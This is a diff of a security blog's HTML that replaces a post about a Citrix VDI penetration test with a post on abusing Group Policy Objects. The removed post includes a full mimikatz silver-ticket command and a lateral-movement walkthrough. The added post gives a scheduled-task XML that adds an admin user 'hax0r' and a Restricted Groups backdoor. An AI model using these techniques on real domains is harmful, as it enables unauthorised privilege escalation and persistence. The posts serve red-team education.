@@ -23,7 +23,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.26">
     <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
-    <title>A Citrix Story</title>
+    <title>GPO Abuse</title>
     <meta name="author" content="Rasta Mouse">
     <meta name="keywords" content="">
 
@@ -31,19 +31,25 @@
     
 
     
-    <meta name="description" content="I recently had the pleasure of partaking in a Citrix Virtual Desktop infrastructure assessment.
+    <meta name="description" content="Intro
+
+Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
 
 ">
-    <meta property="og:description" content="I recently had the pleasure of partaking in a Citrix Virtual Desktop infrastructure assessment.
+    <meta property="og:description" content="Intro
+
+Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
 
 ">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="A Citrix Story">
-    <meta property="og:url" content="/2017/05/a-citrix-story/">
+    <meta property="og:title" content="GPO Abuse">
+    <meta property="og:url" content="/2018/04/gpo-abuse/">
     <meta property="og:site_name" content="Rasta Mouse">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Rasta Mouse">
-    <meta name="twitter:description" content="I recently had the pleasure of partaking in a Citrix Virtual Desktop infrastructure assessment.
+    <meta name="twitter:description" content="Intro
+
+Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.
 
 ">
     
@@ -59,7 +65,7 @@
     
 
     
-      <meta property="og:image" content="https://rastamouse.me/images/citrix/citrix-icon.png">
+      <meta property="og:image" content="https://rastamouse.me/images/gpo/thumb.png">
     
     
     
@@ -251,18 +257,18 @@ ga('send', 'pageview');
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      A Citrix Story
+      GPO Abuse
     </h1>
   
   <div class="postShorten-meta post-meta">
   
-    <time itemprop="datePublished" datetime="2017-05-13T00:00:00Z">
+    <time itemprop="datePublished" datetime="2018-04-07T00:00:00Z">
       
   
   
   
   
-    13 May 2017
+    7 April 2018
   
 
     </time>
@@ -283,247 +289,198 @@ ga('send', 'pageview');
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>I recently had the pleasure of partaking in a Citrix Virtual Desktop infrastructure assessment.</p>
+              <h2 id="intro">Intro</h2>
+
+<p>Being able to write to a Group Policy Object affords you some interesting opportunities.  Depending on circumstance, it can either be used as a priv esc vector - e.g. if you control a GPO that is applied to machines that have higher privileged accounts logged on; or as a persistence mechanism to maintain access to those machines.</p>
 
 <p></p>
 
-<h2 id="background">Background</h2>
+<p><a href="https://twitter.com/_wald0">Andy Robbins</a> gives a brilliant overview in his <a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">A Red Teamer’s Guide to GPOs and OUs</a> article, and highlights several abuse primitives that we should consider.</p>
 
-<p>The purpose of the system was to provide staff a means of accessing internal resources via a BYOD model.  They would login to a publically available Citrix Access Gateway and receive a virtual desktop instance of Windows 7.</p>
+<p>The bit we&rsquo;re currently missing is an effective method of weaponising these ideas, outside of being able to use the Group Policy Management Console.</p>
 
-<p>The scope was limited to the VDI&rsquo;s so I wasn&rsquo;t to attack other elements of the domain, which made lateral movement a pain in particular.  This post is an outline of how, after initial local privilege escalation, I was able to leverage Kerberos Silver Tickets as a means of maintaining elevated persistence and lateral movement capability.</p>
+<p><a href="https://twitter.com/harmj0y">Will Schroeder</a> made some ground when he published <a href="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions</a> and implemented <code>New-GPOImmediateTask</code> into <code>PowerView</code>.</p>
 
-<p>This was a partial white-box review, so I did have some valid credentials to log in with.  So we&rsquo;ll kick this off with a Cobalt Strike foothold.</p>
+<p>Let&rsquo;s take this as a bit of a case study, and see if we can build on the work&hellip;</p>
+
+<h2 id="scheduled-tasks">Scheduled Tasks</h2>
+
+<p>First, we will want to create a new GPO and link it to our test OU.</p>
+
+<pre><code class="language-text">PS C:\&gt; New-GPO -Name &quot;Demo GPO&quot; | New-GPLink -Target &quot;OU=Workstations,DC=testlab,DC=local&quot;
+
+GpoId       : 811e863b-1be4-498e-bc0e-c29fb11af99a
+DisplayName : Demo GPO
+Enabled     : True
+Enforced    : False
+Target      : OU=Workstations,DC=testlab,DC=local
+Order       : 1
+</code></pre>
+
+<p>Create a new <code>Immediate Task</code> in <code>Computer Configuration &gt; Preferences &gt; Control Panel Settings &gt; Scheduled Tasks</code>.  In this example, we&rsquo;ll create an action to add a new local user account and add it to the local administrators group.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/citrix/1-vdi4_nlove.PNG" />
+        <img src="https://rastamouse.me/images/gpo/evil-task.png" />
     
     
 </figure>
 
 
-<h2 id="persistence">Persistence</h2>
+<p>Force a GPO update and verify the task was triggered.</p>
 
-<p>I have a session as <code>nlove</code>, and I&rsquo;d like to keep it that way.  One tricky aspect to VDI is that each time a user logs on, they get assigned a fresh desktop from the master image.  This means that once a user logs off a virtual desktop, any changes they may&rsquo;ve made are lost.  Provisions must be made for users&rsquo; files etc, but like regular domain roaming profiles, there are some elements that get left behind.</p>
+<pre><code class="language-text">PS C:\&gt; gpupdate /target:computer /force
+Updating policy...
 
-<p>In this case, it turns out practically everything that occurs within userland persist across different VDI sessions, including HKCU.  So I setup a really simple level of persistence in <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>.</p>
+Computer Policy update has completed successfully.
+</code></pre>
 
-<p>This persistence method also helps us with our lateral movement problem - more on that later.</p>
+<pre><code class="language-text">PS C:\&gt; net user
 
-<h2 id="priv-esc">Priv Esc</h2>
+User accounts for \\WKSTN01
 
-<p>This turned out to be relatively simple.</p>
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+hax0r
+The command completed successfully.
+</code></pre>
+
+<pre><code class="language-text">
+
+PS C:\&gt; net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+hax0r
+LAB\Domain Admins
+The command completed successfully.
+</code></pre>
+
+<h3 id="behind-the-magician-s-curtain">Behind the Magician&rsquo;s Curtain</h3>
+
+<p>If we have a look inside the SYSVOL directory for this GPO, we can see that it actually created <code>ScheduledTasks.xml</code> within <code>\Machine\Preferences\ScheduledTasks</code>.</p>
+
+<pre><code class="language-text">PS C:\&gt; ls &quot;\\testlab.local\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Preferences\ScheduledTasks\&quot;
+
+    Directory:
+    \\dc01\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Preferences\ScheduledTasks
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/04/2018     20:06           1832 ScheduledTasks.xml
+</code></pre>
+
+<p>It doesn&rsquo;t actually look like this, but I&rsquo;ve cleaned it up to look more readable (if you can believe it).</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+
+&lt;ScheduledTasks clsid=&quot;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&quot;&gt;
+    &lt;ImmediateTaskV2 clsid=&quot;{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}&quot; name=&quot;Evil Task&quot; image=&quot;0&quot; changed=&quot;2018-04-10 19:06:58&quot; uid=&quot;{66305D26-9F45-445E-86B7-F945578F4746}&quot;&gt;
+        &lt;Properties action=&quot;C&quot; name=&quot;Evil Task&quot; runAs=&quot;NT AUTHORITY\System&quot; logonType=&quot;S4U&quot;&gt;
+            &lt;Task version=&quot;1.3&quot;&gt;
+                &lt;RegistrationInfo&gt;
+                    &lt;Author&gt;LAB\rastamouse&lt;/Author&gt;
+                    &lt;Description&gt;&lt;/Description&gt;
+                &lt;/RegistrationInfo&gt;
+                &lt;Principals&gt;
+                    &lt;Principal id=&quot;Author&quot;&gt;
+                        &lt;UserId&gt;NT AUTHORITY\System&lt;/UserId&gt;
+                        &lt;LogonType&gt;S4U&lt;/LogonType&gt;
+                        &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+                    &lt;/Principal&gt;
+                &lt;/Principals&gt;
+                &lt;Settings&gt;
+                    &lt;IdleSettings&gt;
+                        &lt;Duration&gt;PT10M&lt;/Duration&gt;
+                        &lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;
+                        &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+                        &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
+                    &lt;/IdleSettings&gt;
+                    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+                    &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;
+                    &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;
+                    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
+                    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;
+                    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
+                    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
+                    &lt;Enabled&gt;true&lt;/Enabled&gt;
+                    &lt;Hidden&gt;false&lt;/Hidden&gt;
+                    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
+                    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
+                    &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;
+                    &lt;Priority&gt;7&lt;/Priority&gt;
+                    &lt;DeleteExpiredTaskAfter&gt;PT0S&lt;/DeleteExpiredTaskAfter&gt;
+                &lt;/Settings&gt;
+                &lt;Triggers&gt;
+                    &lt;TimeTrigger&gt;
+                        &lt;StartBoundary&gt;%LocalTimeXmlEx%&lt;/StartBoundary&gt;
+                        &lt;EndBoundary&gt;%LocalTimeXmlEx%&lt;/EndBoundary&gt;
+                        &lt;Enabled&gt;true&lt;/Enabled&gt;
+                    &lt;/TimeTrigger&gt;
+                &lt;/Triggers&gt;
+                &lt;Actions Context=&quot;Author&quot;&gt;
+                    &lt;Exec&gt;
+                        &lt;Command&gt;c:\windows\system32\cmd.exe&lt;/Command&gt;
+                        &lt;Arguments&gt;/c &quot;net user hax0r Passw0rd! /add &amp;amp;&amp;amp; net localgroup administrators hax0r /add&quot;&lt;/Arguments&gt;
+                    &lt;/Exec&gt;
+                &lt;/Actions&gt;
+            &lt;/Task&gt;
+        &lt;/Properties&gt;
+    &lt;/ImmediateTaskV2&gt;
+&lt;/ScheduledTasks&gt;
+</code></pre>
+
+<p>Going back and reviewing the <code>PowerView</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L6587">source</a> for <code>New-GPOImmediateTask</code> - we can see that it uses a similar XML template and <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L6616">writes</a> it into the same path as we observed.</p>
+
+<h2 id="going-further">Going Further</h2>
+
+<p>So the basic methodolgy here is to make a GPO modification in the GPMC, see what files get dropped into SYSVOL and reverse engineer them.  Let&rsquo;s use <code>Restricted Groups</code> as another example.</p>
+
+<p>This is found in <code>Computer Configuration &gt; Windows Settings &gt; Security Settings &gt; Restricted Groups</code> and allows you to manipulate localgroup membership.  One possibility is to add a domain account to the local admin group.</p>
 
 
 <figure >
     
-        <img src="https://rastamouse.me/images/citrix/2-vdi4_localadmins.PNG" />
+        <img src="https://rastamouse.me/images/gpo/restricted-groups.png" />
     
     
 </figure>
 
 
-<p>One of the system administrators must&rsquo;ve put <code>bob</code> in at some point for testing or during early development, but it was a pretty big derp as it has no password.  The only difficultly I had was spawning a new session via Beacon.  The built-in parser won&rsquo;t handle a blank password and writing a custom aggressor script to run <code>bspawnas</code> didn&rsquo;t work either.  I tried a few others like <code>runas</code>, but I eventually resigned myself to elevating in the actual virtual desktop.  So I just uploaded a stageless PowerShell SMB payload and ran it manually.</p>
+<p>Or if you were a little crazy, make any authenticated user a local admin&hellip;</p>
 
-<p>
+
 <figure >
     
-        <img src="https://rastamouse.me/images/citrix/3-vdi4_bob.PNG" />
+        <img src="https://rastamouse.me/images/gpo/restricted-groups-2.png" />
     
     
 </figure>
 
 
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/4-vdi4_smbbeacon.PNG" />
-    
-    
-</figure>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/5-vdi4_bobbeacon.PNG" />
-    
-    
-</figure>
-</p>
-
-<p>If any readers have a solution to this - please let me know!</p>
-
-<p>Now that we have admin access over the desktop, we can carry out the classic act of dumping all the password hashes.  The accounts we&rsquo;re interested in are <code>CitrixAdmin</code> and <code>VDI-004$</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/6-vdi4_creds.PNG" />
-    
-    
-</figure>
-
-
-<p>The Cobalt Strike credential parser doesn&rsquo;t grab machine hashes by default.  <a href="https://github.com/bluscreenofjeff/AggressorScripts/blob/master/silver-tickets.cna">Silver Ticket Monitor</a> is an aggressor extension built by <a href="https://twitter.com/bluscreenofjeff">Jeff Dimmock</a>, which enables machine hash tracking and provides a new GUI popup for crafting Silver Tickets.</p>
-
-<h2 id="lateral-movement">Lateral Movement</h2>
-
-<p>Even though I have the credentials for 2 local admin accounts (the built-in Administrator account is disabled), they can&rsquo;t be used to move laterally across the other VDIs.  Non-RID 500 accounts cannot (by default) authenticate as administrators across a network, even if the credentials are identical across computers.  <a href="https://twitter.com/harmj0y">Will Schroeder</a> <a href="http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">blogged</a> about this a while ago.</p>
-
-<h2 id="the-desktop-shuffle">The Desktop Shuffle</h2>
-
-<p>This is where things start getting at least a little more interesting.</p>
-
-<p>Let&rsquo;s say <code>nlove</code> logs off for the day and we lose our Beacons.  Next morning he logs on and gets a fresh virtual desktop.  Because his user profile follows him from desktop to desktop, our registry persistence calls back and we get a new session.  This time on <code>VDI-001</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/7-vdi1_nlove.PNG" />
-    
-    
-</figure>
-
-
-<p>We can elevate using the <code>CitrixAdmin</code> account, because the password is the same across all systems.  Here, we do a <code>spawnas</code> and <code>bypassuac</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/8-vdi1_elevate.PNG" />
-    
-    
-</figure>
-
-
-<p>We can now dump the machine hash for <code>VDI-001</code>.  The next trick, is moving laterally back to <code>VDI-004</code>, which we can do using its machine hash that we obtained previously.  Using Jeff&rsquo;s extension:</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/9-silver_ticket.PNG" />
-    
-    
-</figure>
-
-
-<p>The domain SID can be obtained via <code>shell whoami /all</code>; and the actual <code>mimiktaz</code> command to forge the Silver Ticket is <code>mimikatz kerberos::golden /user:CitrixAdmin /domain:wild-west.local /sid:S-1-5-21-4247185703-3639085842-2880657779 /target:VDI-004.wild-west.local /rc4:ea0830b4abd1f2c976bb443f64f8186d /service:cifs /ptt</code></p>
-
-<p>Once the ticket has been injected into our current session, we can simply do a <code>psexec_psh</code> (or whatever method you prefer) to take <code>VDI-004</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/10-vdi1_4.PNG" />
-    
-    
-</figure>
-
-
-<p>Now we have control over 2 VDIs.</p>
-
-<p>If we take a look at <code>VDI-004</code> we can see that it&rsquo;s been assigned to another user, <code>rparker</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/11-vdi4_netlogons.PNG" />
-    
-    
-</figure>
-
-
-<p>We can obviously steal his password, inject a new Beacon into one of his processes and setup the same userland persistance as with <code>nlove</code>.</p>
-
-<p>
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/12-vdi4_creds.PNG" />
-    
-    
-</figure>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/13-vdi1_4.PNG" />
-    
-    
-</figure>
-</p>
-
-<h3 id="rince-and-repeat">Rince and Repeat</h3>
-
-<p>Let&rsquo;s say another day goes by, <code>nlove</code> and <code>rparker</code> have logged back in and are assigned <code>VDI-005</code> and <code>VDI-003</code> respectively.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/14-vdi3_5.PNG" />
-    
-    
-</figure>
-
-
-<p>We elevate on both desktops.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/15-vdi3_5_elevated.PNG" />
-    
-    
-</figure>
-
-
-<p>Dump the hashes.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/16-vdi1345_creds.PNG" />
-    
-    
-</figure>
-
-
-<p>And Pass the Ticket to take <code>VDI-001</code> and <code>VDI-004</code> again.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/17-moar_vdi.PNG" />
-    
-    
-</figure>
-
-
-<p>We now discover a new user on <code>VDI-004</code> - <code>jhardin</code>.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/18-vdi4_jhardin.PNG" />
-    
-    
-</figure>
-
-
-<p>Follow the same process of persisting as <code>jhardin</code> and spreading to more desktops.</p>
-
-
-<figure >
-    
-        <img src="https://rastamouse.me/images/citrix/19-final.PNG" />
-    
-    
-</figure>
-
-
-<h2 id="conclusion">Conclusion</h2>
-
-<p>There are obviously better and more elegent methods of moving laterally across machines.  Given the limitation of the scope, this seemed to be the best available option.  By default, computer hashes are automatically rotated every 30 days, so it would be a lot of work to maintain access across a large number of desktops.  As long as there is sufficient overlap between the computer and <code>CitrixAdmin</code> account passwords being changed, you could likely persist in this manner for a long time.</p>
+<p>This particular configuration creates <code>GptTmpl.inf</code> in <code>\Machine\Microsoft\Windows NT\SecEdit\</code>.</p>
+
+<pre><code class="language-text">PS C:\&gt; cat &quot;\\testlab.local\sysvol\testlab.local\Policies\{811E863B-1BE4-498E-BC0E-C29FB11AF99A}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf&quot;
+
+[Unicode]
+Unicode=yes
+[Version]
+signature=&quot;$CHICAGO$&quot;
+Revision=1
+[Group Membership]
+*S-1-5-32-544__Memberof =
+*S-1-5-32-544__Members = *S-1-5-21-1078383433-4142403703-1311514137-1105
+</code></pre>
+
+<p>Where <code>S-1-5-32-544</code> is the SID of the local admin group and <code>S-1-5-21-1078383433-4142403703-1311514137-1105</code> is the SID of my <code>LAB\backdoor</code> user account.</p>
+
+<p>I have a conservative list of others I&rsquo;ve looked at thus far in my <a href="https://github.com/rasta-mouse/GPO-Abuse">GPO Abuse Repo</a>.</p>
               
             </div>
           </div>
@@ -535,15 +492,9 @@ ga('send', 'pageview');
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/citrix/">citrix</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/gpo/">gpo</a>
 
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/cobalt-strike/">cobalt strike</a>
-
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/mimikatz/">mimikatz</a>
-
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/pass-the-ticket/">pass the ticket</a>
-
-  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/silver-tickets/">silver tickets</a>
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/active-directory/">active directory</a>
 
                   </div>
                 
@@ -555,7 +506,7 @@ ga('send', 'pageview');
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/playing-with-cuckoo/" data-tooltip="Playing with Cuckoo">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -563,7 +514,7 @@ ga('send', 'pageview');
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--disabled">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/a-view-of-persistence/" data-tooltip="A View of Persistence">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -580,17 +531,17 @@ ga('send', 'pageview');
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -636,7 +587,7 @@ ga('send', 'pageview');
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/05/playing-with-cuckoo/" data-tooltip="Playing with Cuckoo">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -644,7 +595,7 @@ ga('send', 'pageview');
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--disabled">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/a-view-of-persistence/" data-tooltip="A View of Persistence">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -661,17 +612,17 @@ ga('send', 'pageview');
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -698,17 +649,17 @@ ga('send', 'pageview');
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f05%2fa-citrix-story%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f04%2fgpo-abuse%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -1016,9 +967,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2017\/05\/a-citrix-story\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/04\/gpo-abuse\/';
           
-            this.page.identifier = '\/2017\/05\/a-citrix-story\/'
+            this.page.identifier = '\/2018\/04\/gpo-abuse\/'
           
         };
         (function() {
